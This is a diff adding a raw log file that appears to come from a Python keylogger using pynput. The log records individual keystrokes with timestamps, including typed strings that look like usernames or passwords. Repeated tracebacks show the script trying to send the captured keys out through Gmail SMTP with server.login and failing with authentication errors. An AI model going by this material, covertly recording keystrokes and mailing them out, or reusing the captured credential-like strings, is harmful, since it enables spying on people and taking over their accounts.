@@ -1,0 +1,1140 @@
+2019-07-27 10:41:10,365: Script send you info of keyboard: Key.ctrl_l
+2019-07-27 10:41:10,779: Script send you info of keyboard: 'c'
+2019-07-27 10:41:12,293: Script send you info of keyboard: Key.ctrl_l
+2019-07-27 10:41:12,450: Script send you info of keyboard: 'c'
+2019-07-27 10:41:12,630: Script send you info of keyboard: 'c'
+2019-07-27 10:41:12,834: Script send you info of keyboard: 'c'
+2019-07-27 10:41:13,017: Script send you info of keyboard: 'c'
+2019-07-27 10:41:13,197: Script send you info of keyboard: 'c'
+2019-07-27 10:41:13,347: Script send you info of keyboard: 'c'
+2019-07-27 10:41:13,499: Script send you info of keyboard: 'c'
+2019-07-27 10:41:13,790: Script send you info of keyboard: Key.ctrl_l
+2019-07-27 10:41:14,294: Script send you info of keyboard: Key.ctrl_l
+2019-07-27 10:41:14,584: Script send you info of keyboard: 'c'
+2019-07-27 10:41:14,767: Script send you info of keyboard: 'c'
+2019-07-27 10:41:15,585: Script send you info of keyboard: 'a'
+2019-07-27 10:41:15,641: Script send you info of keyboard: 's'
+2019-07-27 10:41:15,653: Script send you info of keyboard: 'd'
+2019-07-27 10:41:15,795: Script send you info of keyboard: 'a'
+2019-07-27 10:41:15,804: Script send you info of keyboard: 's'
+2019-07-27 10:41:15,890: Script send you info of keyboard: 'd'
+2019-07-27 10:41:15,968: Script send you info of keyboard: 's'
+2019-07-27 10:41:15,976: Script send you info of keyboard: 'a'
+2019-07-27 10:41:16,063: Script send you info of keyboard: 'd'
+2019-07-27 10:41:16,151: Script send you info of keyboard: 'j'
+2019-07-27 10:41:16,170: Script send you info of keyboard: 's'
+2019-07-27 10:41:16,179: Script send you info of keyboard: 'a'
+2019-07-27 10:41:16,197: Script send you info of keyboard: 'h'
+2019-07-27 10:41:16,252: Script send you info of keyboard: 'd'
+2019-07-27 10:41:16,307: Script send you info of keyboard: 'k'
+2019-07-27 10:41:16,351: Script send you info of keyboard: 'a'
+2019-07-27 10:41:16,359: Script send you info of keyboard: 's'
+2019-07-27 10:41:16,442: Script send you info of keyboard: 'd'
+2019-07-27 10:41:16,500: Script send you info of keyboard: 'k'
+2019-07-27 10:41:16,531: Script send you info of keyboard: 'a'
+2019-07-27 10:41:16,549: Script send you info of keyboard: 's'
+2019-07-27 10:44:49,862: Script send you info of keyboard: 'e'
+2019-07-27 10:44:50,963: Script send you info of keyboard: 'e'
+2019-07-27 10:44:51,163: Script send you info of keyboard: 'e'
+2019-07-27 10:44:51,336: Script send you info of keyboard: 'e'
+2019-07-27 10:44:51,491: Script send you info of keyboard: 'e'
+2019-07-27 10:44:51,635: Script send you info of keyboard: 'e'
+2019-07-27 10:44:51,794: Script send you info of keyboard: 'e'
+2019-07-27 10:44:51,948: Script send you info of keyboard: 'e'
+2019-07-27 10:44:52,123: Script send you info of keyboard: 'e'
+2019-07-27 10:44:52,284: Script send you info of keyboard: 'e'
+2019-07-27 10:44:52,442: Script send you info of keyboard: 'e'
+2019-07-27 10:44:52,576: Script send you info of keyboard: 'e'
+2019-07-27 10:45:49,996: Script send you info of keyboard: 'e'
+2019-07-27 10:45:51,012: Script send you info of keyboard: 'e'
+2019-07-27 10:45:51,185: Script send you info of keyboard: 'e'
+2019-07-27 10:45:51,352: Script send you info of keyboard: 'e'
+2019-07-27 10:45:51,514: Script send you info of keyboard: 'e'
+2019-07-27 10:45:51,640: Script send you info of keyboard: 'e'
+2019-07-27 10:46:41,047: Script send you info of keyboard: Key.shift_r
+2019-07-27 10:46:43,388: Script send you info of keyboard: 'e'
+2019-07-27 10:46:43,765: Script send you info of keyboard: 'e'
+2019-07-27 10:46:43,946: Script send you info of keyboard: 'e'
+2019-07-27 10:46:44,110: Script send you info of keyboard: 'e'
+2019-07-27 10:46:44,264: Script send you info of keyboard: 'e'
+2019-07-27 10:46:44,414: Script send you info of keyboard: 'e'
+2019-07-27 10:46:44,562: Script send you info of keyboard: 'e'
+2019-07-27 10:46:44,711: Script send you info of keyboard: 'e'
+2019-07-27 10:46:44,862: Script send you info of keyboard: 'e'
+2019-07-27 10:46:45,012: Script send you info of keyboard: 'e'
+2019-07-27 10:56:18,733: Infomation: 'e'
+2019-07-27 10:56:27,078: Infomation: 's'
+2019-07-27 10:56:29,760: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 49, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials o9sm26067347pgv.19 - gsmtp')
+2019-07-27 10:58:44,025: Infomation: 's'
+2019-07-27 10:58:46,165: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 49, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials r2sm72135209pfl.67 - gsmtp')
+2019-07-27 11:00:55,827: Infomation: 'g'
+2019-07-27 11:00:56,573: Infomation: 'm'
+2019-07-27 11:00:56,922: Infomation: Key.enter
+2019-07-27 11:00:57,595: Infomation: Key.enter
+2019-07-27 11:01:47,683: Infomation: Key.backspace
+2019-07-27 11:01:53,388: Infomation: 'h'
+2019-07-27 11:01:53,449: Infomation: 'a'
+2019-07-27 11:01:53,533: Infomation: 'c'
+2019-07-27 11:01:53,720: Infomation: 'l'
+2019-07-27 11:01:53,895: Infomation: 'o'
+2019-07-27 11:01:54,135: Infomation: 'n'
+2019-07-27 11:01:54,333: Infomation: 'g'
+2019-07-27 11:01:54,507: Infomation: 't'
+2019-07-27 11:01:54,631: Infomation: 'd'
+2019-07-27 11:01:54,831: Infomation: '1'
+2019-07-27 11:01:54,966: Infomation: '9'
+2019-07-27 11:01:55,132: Infomation: '9'
+2019-07-27 11:01:55,216: Infomation: '4'
+2019-07-27 11:01:55,835: Infomation: Key.enter
+2019-07-27 11:02:03,724: Infomation: Key.shift
+2019-07-27 11:02:03,879: Infomation: 'h'
+2019-07-27 11:02:04,126: Infomation: 'u'
+2019-07-27 11:02:04,326: Infomation: 'n'
+2019-07-27 11:02:04,499: Infomation: 'g'
+2019-07-27 11:02:04,704: Infomation: 'l'
+2019-07-27 11:02:04,802: Infomation: 'a'
+2019-07-27 11:02:04,891: Infomation: 'p'
+2019-07-27 11:02:04,995: Infomation: 'r'
+2019-07-27 11:02:05,053: Infomation: 'o'
+2019-07-27 11:02:05,150: Infomation: '1'
+2019-07-27 11:02:05,249: Infomation: '3'
+2019-07-27 11:02:05,436: Infomation: Key.enter
+2019-07-27 11:02:07,516: Infomation: 'p'
+2019-07-27 11:02:07,788: Infomation: 'h'
+2019-07-27 11:02:07,881: Infomation: 'a'
+2019-07-27 11:02:08,047: Infomation: 'n'
+2019-07-27 11:02:08,178: Infomation: 't'
+2019-07-27 11:02:08,297: Infomation: 'h'
+2019-07-27 11:02:08,375: Infomation: 'a'
+2019-07-27 11:02:08,502: Infomation: 'n'
+2019-07-27 11:02:08,685: Infomation: 'h'
+2019-07-27 11:02:08,852: Infomation: 'h'
+2019-07-27 11:02:09,020: Infomation: 'u'
+2019-07-27 11:02:09,191: Infomation: 'n'
+2019-07-27 11:02:09,325: Infomation: 'g'
+2019-07-27 11:02:09,537: Infomation: Key.enter
+2019-07-27 11:02:11,399: Infomation: Key.shift
+2019-07-27 11:02:11,584: Infomation: 'p'
+2019-07-27 11:02:12,089: Infomation: Key.backspace
+2019-07-27 11:02:12,252: Infomation: Key.backspace
+2019-07-27 11:02:12,744: Infomation: 'p'
+2019-07-27 11:02:13,034: Infomation: 'h'
+2019-07-27 11:02:13,179: Infomation: 'a'
+2019-07-27 11:02:13,285: Infomation: 'n'
+2019-07-27 11:02:13,504: Infomation: 't'
+2019-07-27 11:02:13,662: Infomation: 'h'
+2019-07-27 11:02:13,772: Infomation: 'a'
+2019-07-27 11:02:13,896: Infomation: 'n'
+2019-07-27 11:02:14,087: Infomation: 'h'
+2019-07-27 11:02:14,237: Infomation: 'h'
+2019-07-27 11:02:14,405: Infomation: 'u'
+2019-07-27 11:02:14,605: Infomation: 'n'
+2019-07-27 11:02:14,713: Infomation: 'g'
+2019-07-27 11:02:14,936: Infomation: Key.enter
+2019-07-27 11:02:16,640: Infomation: 'p'
+2019-07-27 11:02:16,873: Infomation: 'h'
+2019-07-27 11:02:17,090: Infomation: 'n'
+2019-07-27 11:02:17,211: Infomation: 'a'
+2019-07-27 11:02:17,635: Infomation: Key.backspace
+2019-07-27 11:02:17,785: Infomation: Key.backspace
+2019-07-27 11:02:17,965: Infomation: Key.backspace
+2019-07-27 11:02:18,122: Infomation: Key.backspace
+2019-07-27 11:02:18,280: Infomation: Key.backspace
+2019-07-27 11:02:18,746: Infomation: 'p'
+2019-07-27 11:02:19,019: Infomation: 'h'
+2019-07-27 11:02:19,163: Infomation: 'a'
+2019-07-27 11:02:19,279: Infomation: 'n'
+2019-07-27 11:02:19,496: Infomation: 't'
+2019-07-27 11:02:19,644: Infomation: 'h'
+2019-07-27 11:02:19,733: Infomation: 'a'
+2019-07-27 11:02:19,907: Infomation: 'n'
+2019-07-27 11:02:20,096: Infomation: 'h'
+2019-07-27 11:02:20,846: Infomation: 'h'
+2019-07-27 11:02:21,054: Infomation: 'u'
+2019-07-27 11:02:21,258: Infomation: 'n'
+2019-07-27 11:02:21,379: Infomation: 'g'
+2019-07-27 11:02:21,738: Infomation: '1'
+2019-07-27 11:02:21,956: Infomation: '3'
+2019-07-27 11:02:22,161: Infomation: Key.enter
+2019-07-27 11:02:23,697: Infomation: Key.shift
+2019-07-27 11:02:23,890: Infomation: 'p'
+2019-07-27 11:02:24,196: Infomation: 'h'
+2019-07-27 11:02:24,304: Infomation: 'a'
+2019-07-27 11:02:24,417: Infomation: 'n'
+2019-07-27 11:02:24,603: Infomation: 't'
+2019-07-27 11:02:24,786: Infomation: 'h'
+2019-07-27 11:02:24,853: Infomation: 'a'
+2019-07-27 11:02:25,013: Infomation: 'n'
+2019-07-27 11:02:25,192: Infomation: 'h'
+2019-07-27 11:02:25,488: Infomation: 'h'
+2019-07-27 11:02:25,667: Infomation: 'u'
+2019-07-27 11:02:25,851: Infomation: 'n'
+2019-07-27 11:02:25,953: Infomation: 'g'
+2019-07-27 11:02:26,185: Infomation: '1'
+2019-07-27 11:02:26,371: Infomation: '3'
+2019-07-27 11:02:26,580: Infomation: Key.enter
+2019-07-27 11:02:39,565: Infomation: Key.shift
+2019-07-27 11:02:39,829: Infomation: 'h'
+2019-07-27 11:02:40,140: Infomation: 'u'
+2019-07-27 11:02:40,355: Infomation: 'n'
+2019-07-27 11:02:40,510: Infomation: 'g'
+2019-07-27 11:02:40,804: Infomation: 'l'
+2019-07-27 11:02:40,907: Infomation: 'a'
+2019-07-27 11:02:41,085: Infomation: 'p'
+2019-07-27 11:02:41,309: Infomation: 'o'
+2019-07-27 11:02:41,714: Infomation: Key.backspace
+2019-07-27 11:02:42,153: Infomation: Key.backspace
+2019-07-27 11:02:42,177: Infomation: Key.backspace
+2019-07-27 11:02:42,201: Infomation: Key.backspace
+2019-07-27 11:02:42,224: Infomation: Key.backspace
+2019-07-27 11:02:42,248: Infomation: Key.backspace
+2019-07-27 11:02:42,272: Infomation: Key.backspace
+2019-07-27 11:02:42,296: Infomation: Key.backspace
+2019-07-27 11:02:42,321: Infomation: Key.backspace
+2019-07-27 11:02:42,343: Infomation: Key.backspace
+2019-07-27 11:02:42,367: Infomation: Key.backspace
+2019-07-27 11:02:42,391: Infomation: Key.backspace
+2019-07-27 11:02:42,416: Infomation: Key.backspace
+2019-07-27 11:02:42,439: Infomation: Key.backspace
+2019-07-27 11:02:42,464: Infomation: Key.backspace
+2019-07-27 11:02:42,488: Infomation: Key.backspace
+2019-07-27 11:02:42,512: Infomation: Key.backspace
+2019-07-27 11:02:42,536: Infomation: Key.backspace
+2019-07-27 11:02:42,646: Infomation: Key.shift
+2019-07-27 11:02:43,038: Infomation: 'h'
+2019-07-27 11:02:43,364: Infomation: 'u'
+2019-07-27 11:02:43,591: Infomation: 'n'
+2019-07-27 11:02:43,771: Infomation: 'g'
+2019-07-27 11:02:44,035: Infomation: 'l'
+2019-07-27 11:02:44,130: Infomation: 'a'
+2019-07-27 11:02:44,254: Infomation: 'p'
+2019-07-27 11:02:44,366: Infomation: 'r'
+2019-07-27 11:02:44,430: Infomation: 'o'
+2019-07-27 11:02:44,534: Infomation: '1'
+2019-07-27 11:02:44,629: Infomation: '3'
+2019-07-27 11:02:44,794: Infomation: Key.enter
+2019-07-27 11:02:47,638: Infomation: Key.shift
+2019-07-27 11:02:48,021: Infomation: 'h'
+2019-07-27 11:02:48,416: Infomation: 'u'
+2019-07-27 11:02:48,633: Infomation: 'n'
+2019-07-27 11:02:48,772: Infomation: 'g'
+2019-07-27 11:02:48,987: Infomation: 'l'
+2019-07-27 11:02:49,102: Infomation: 'a'
+2019-07-27 11:02:49,235: Infomation: 'p'
+2019-07-27 11:02:49,352: Infomation: 'r'
+2019-07-27 11:02:49,438: Infomation: 'o'
+2019-07-27 11:02:49,527: Infomation: '1'
+2019-07-27 11:02:49,642: Infomation: '3'
+2019-07-27 11:02:50,026: Infomation: '2'
+2019-07-27 11:02:50,369: Infomation: '9'
+2019-07-27 11:02:55,411: Infomation: 'l'
+2019-07-27 11:02:55,639: Infomation: 'i'
+2019-07-27 11:02:55,939: Infomation: 't'
+2019-07-27 11:02:56,156: Infomation: 'o'
+2019-07-27 11:02:56,389: Infomation: 'u'
+2019-07-27 11:02:57,271: Infomation: 's'
+2019-07-27 11:02:58,806: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 49, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials g2sm53270859pfi.26 - gsmtp')
+2019-07-27 11:07:02,868: Infomation: 's'
+2019-07-27 11:07:29,199: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 49, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials p26sm16509pgl.64 - gsmtp')
+2019-07-27 11:08:32,089: Infomation: 's'
+2019-07-27 11:08:42,079: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 50, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials v12sm48081328pgr.86 - gsmtp')
+2019-07-27 11:10:19,542: Infomation: 's'
+2019-07-27 11:10:21,913: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 50, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials o14sm44487453pjp.19 - gsmtp')
+2019-07-27 11:20:39,311: Infomation: 's'
+2019-07-27 11:20:50,240: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 52, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials x24sm51811424pgl.84 - gsmtp')
+2019-07-27 11:22:29,749: Infomation: 's'
+2019-07-27 11:22:36,637: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 51, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials v27sm74045824pgn.76 - gsmtp')
+2019-07-27 11:23:15,960: Infomation: 's'
+2019-07-27 11:23:21,408: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 51, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials 81sm87121594pfx.111 - gsmtp')
+2019-07-27 11:23:37,496: Infomation: 's'
+2019-07-27 11:23:46,936: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 51, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials 125sm72622933pfg.23 - gsmtp')
+2019-07-27 11:28:05,459: Infomation: 'h'
+2019-07-27 11:28:05,567: Infomation: 'a'
+2019-07-27 11:28:05,752: Infomation: 'h'
+2019-07-27 11:28:05,879: Infomation: 'a'
+2019-07-27 11:28:06,570: Infomation: 'h'
+2019-07-27 11:28:06,657: Infomation: 'a'
+2019-07-27 11:28:06,818: Infomation: 'h'
+2019-07-27 11:28:06,889: Infomation: 'a'
+2019-07-27 11:28:06,917: Infomation: 's'
+2019-07-27 11:28:30,456: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 52, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials 85sm56682007pfv.130 - gsmtp')
+2019-07-27 11:31:17,789: Infomation: 's'
+2019-07-27 11:31:27,419: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 52, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials x14sm70778012pfq.158 - gsmtp')
+2019-07-27 11:32:40,689: Infomation: 's'
+2019-07-27 11:32:48,563: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 53, in on_press
+    server.login(sender_email, password.str)
+AttributeError: 'str' object has no attribute 'str'
+2019-07-27 11:36:09,133: Infomation: 'h'
+2019-07-27 11:36:10,607: Infomation: 's'
+2019-07-27 11:36:19,647: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 53, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
